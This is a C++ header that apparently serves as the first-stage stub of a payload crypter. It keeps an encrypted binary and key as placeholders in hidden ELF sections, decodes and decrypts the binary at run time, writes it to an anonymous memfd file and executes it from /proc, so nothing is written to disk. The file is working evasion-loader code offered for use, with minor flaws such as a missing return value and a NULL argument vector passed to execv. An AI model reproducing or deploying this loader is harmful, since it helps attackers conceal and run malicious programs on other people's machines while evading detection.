
#include "stdafx.h"

#ifndef Stage1_H
#define Stage1_H

#define MEMFD_CREATE 319
inline int anonFile(const char *name, unsigned int flags) {
    return syscall(MEMFD_CREATE, name, flags);
}

#define CRYPTED __attribute__((section(".secure")))
#define SECRET __attribute__((section(".secret")))

// The secrets to hide.
SECRET unsigned char codedPayload[] = "{{PAYLOAD}}";
SECRET char key[] = "{{KEY}}";

// The code functionality to hide.
CRYPTED int stub() {/* Marker for top of section */}

CRYPTED unsigned char* decodePayload() {
    unsigned char* decoded = new unsigned char[sizeof(codedPayload) / 2];

    int j = 0;
    for (int i = 0; i < sizeof(codedPayload); i += 2) {
        
        char byte[] = {codedPayload[i], codedPayload[i +1]};
        decoded[j] = (char)strtol(byte, 0, +16);
        j++;
    }
    return decoded;
}

CRYPTED unsigned char* decryptPayload() {

    unsigned char* payload = decodePayload();
    unsigned char* decrypted = new unsigned char[sizeof(codedPayload) /2];

    for (int i = 0; i < sizeof(codedPayload) /2; i++) {
        decrypted[i] = payload[i] - key[i % 10];
    }

    return decrypted;
}

CRYPTED bool executePayload() {

    // First decrypt payload.
    unsigned char* decrypted = decryptPayload();
    if (decrypted == NULL) {
        printf("Failed to decrypt payload!\n");
        return false;
    }
    
    // Write decrypted payload to memory description. 
    int fd = anonFile("a", 1);
    write(fd, decrypted, sizeof(codedPayload) /2);

    // Assemble new path.
    char path[1024];
    snprintf(path, 1024, "/proc/%d/fd/%d", getpid(), fd);

    // Create new proccess with the binary.
    printf("Executing actual binary now...[%s]\n", path);

    if (execv(path, NULL) == -1) {
        printf("Failed to execute binary! Code: %d\n", errno);
        return 1;
    }

    return true;
}

#endif //!~ Stage1_H
 
